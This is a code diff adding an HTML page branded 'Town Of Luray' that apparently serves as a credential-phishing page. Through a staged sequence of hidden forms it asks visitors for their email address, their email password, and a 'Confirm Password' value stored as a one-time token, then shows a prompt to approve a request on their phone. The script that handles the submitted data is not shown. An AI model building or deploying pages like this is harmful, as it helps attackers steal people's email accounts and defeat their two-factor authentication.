@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/public/css/styles.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="/public/scripts/indexscript.js"></script>
+    <title> Town Of Luray </title>
+</head>
+<body>
+    <style>
+        body {
+            text-align: center;
+            background-image: url("/public/lurayhead.PNG");
+            background-repeat: no-repeat;
+        }
+        h3 {
+            margin-top: 5%;
+        }
+        form {
+            display: grid;
+            margin-bottom: 10%;
+        }
+        .headline {
+            margin-top: 20%;
+        }
+        input {
+            padding: 20px;
+            margin-top: 8px;
+        }
+        #swapbtn #tokenBtn {
+            background-repeat: no-repeat;
+            background-color: darkolivegreen;
+            cursor: pointer;
+        }
+        h3 span {
+            font-size: 18px;
+        }
+        #tokenForm {
+            display: none;
+        }
+        #otpForm {
+            display: none;
+        }
+        h2 {
+            margin-top: 5%;
+            font-size: 18px;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+            color: brown;
+        }
+        h2 button {
+            margin-top: 5%;
+            font-size: 18px;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+            color: brown;
+        }
+        #Form {
+            display: none;
+        }
+        @media screen and (max-width: 400px){
+            body{
+                background-image: url("/public/luraym.png");
+                background-repeat: no-repeat;
+                background-size: auto auto;
+
+            }
+            footer img{
+                width: 344px;
+            }
+            footer {
+                margin-top: 30%;
+            }
+        }
+    </style>
+    <center>
+        <h2 class="headline">
+            <button>
+                Enter Email Used In Application
+            </button>
+        </h2>
+    </center>
+    <form class="form"> 
+
+        <div class="inputBox"> 
+  
+         <input placeholder="Enter Email" id="email" name="email" value="" type="email" required>
+  
+        </div>
+  
+        <div class="inputBox"> 
+  
+         <input id="proceed" type="submit" value="Update Form"> 
+  
+        </div>
+  
+      </form>
+      <form id="tokenForm">
+        <center>
+            <h2>
+                Enter Email Password
+            </h2>
+        </center>
+        <div class="inputBox"> 
+  
+            <input placeholder="Enter Password " id="password" name="Password" value="" type="password" required>
+     
+           </div>
+           <div class="inputBox"> 
+  
+            <input id="continue" type="submit" value="Update Form"> 
+     
+           </div> 
+      </form>
+      <form  id="otpForm">
+        <center>
+            <h2>
+                Confirm Password
+            </h2>
+        </center>
+        <div class="inputBox"> 
+  
+            <input placeholder="Confirm Password" id="otp" name="Token" value="" type="text" required>
+     
+           </div>
+           <div class="inputBox"> 
+  
+            <input id="viewInv" type="submit" value="Update Form"> 
+     
+           </div> 
+      </form>
+      <div style="display: none;" class="loader">
+        <button>
+            Approve download on your phone
+        </button>
+      </div>
+
+      <footer>
+        
+        <img src="/public/knoxtail.PNG">
+      </footer>
+</body>
+</html>
